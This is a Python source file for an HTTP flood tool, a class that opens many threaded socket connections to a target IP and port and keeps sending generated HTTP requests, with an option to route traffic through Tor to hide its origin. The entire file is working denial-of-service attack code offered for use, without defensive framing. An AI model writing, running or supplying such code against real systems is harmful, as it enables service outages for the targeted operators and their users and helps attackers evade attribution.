import logging
import random
import time
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore
from .http_request import HttpRequestGenerator
from .socket_manager import SocketManager
from .tor_manager import TorManager

init(autoreset=True)

class HttpFlood:
    def __init__(self, target_ip, target_port, use_tor=False, num_threads=10):
        self.target_ip = target_ip
        self.target_port = target_port
        self.headers = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding: gzip, deflate, sdch",
            "Accept-Language: en-US,en;q=0.8",
            "Connection: keep-alive",
        ]
        self.is_running = True
        self.use_tor = use_tor
        self.num_threads = num_threads

        self.http_request_generator = HttpRequestGenerator(target_ip, self.headers)
        self.socket_manager = SocketManager()
        self.tor_manager = TorManager() if use_tor else None

    def attack(self):
        logging.info(f"Starting HTTP Flood attack to {self.target_ip}:{self.target_port}")

        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            futures = [executor.submit(self.send_request) for _ in range(self.num_threads)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(Fore.RED + f"Error in thread: {e}")

        logging.info(f"HTTP Flood attack to {self.target_ip}:{self.target_port} finished")

    def send_request(self):
        while self.is_running:
            try:
                if self.use_tor:
                    session = self.tor_manager.get_tor_session()
                    response = session.get("http://localhost:8000")
                    if response.status_code == 200:
                        logging.debug("Tor connection established. Your IP is: " + response.json()['origin'])
                    else:
                        logging.error("Failed to connect to Tor.")
                        continue

                self.socket_manager.connect(self.target_ip, self.target_port)
                if self.socket_manager.sock:
                    http_request = self.http_request_generator.create_http_request()
                    self.socket_manager.send(http_request)
                    logging.debug(Fore.GREEN + f"Sent HTTP request: {http_request}")

                    time.sleep(random.uniform(0.1, 1.0))
                else:
                    logging.error(Fore.RED + "Skipping sending HTTP request due to connection failure")

            except socket.timeout:
                logging.error(Fore.YELLOW + "Socket connection timed out")
            except socket.error as e:
                logging.error(Fore.RED + f"Socket error: {e}")
            except Exception as e:
                logging.error(Fore.RED + f"Unexpected error: {e}")
            finally:
                self.socket_manager.close()

    def stop_attack(self):
        self.is_running = False
